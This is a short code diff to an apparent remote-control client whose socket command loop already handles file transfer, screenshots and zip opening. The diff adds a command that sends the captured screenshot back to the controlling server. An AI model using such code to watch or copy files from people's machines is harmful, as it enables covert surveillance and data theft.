@@ -10,6 +10,7 @@
 from incomingFile import incomingFile
 from openZip import openZip
 from screenShot import screenShot
+from sendToServer import sendToServer
 import subprocess
 import sys
 
@@ -18,6 +19,9 @@ def runShell(socketHolder):
 	if data:
 		if data == "SENDFILE":
 			incomingFile(socketHolder)
+		elif data == "RECOVERFILE":
+			fileName = "client_screen.png"
+			sendToServer(fileName, socketHolder)
 		elif data == "SCREENSHOT":
 			screenShot()
 		elif data == "OPENZIP":
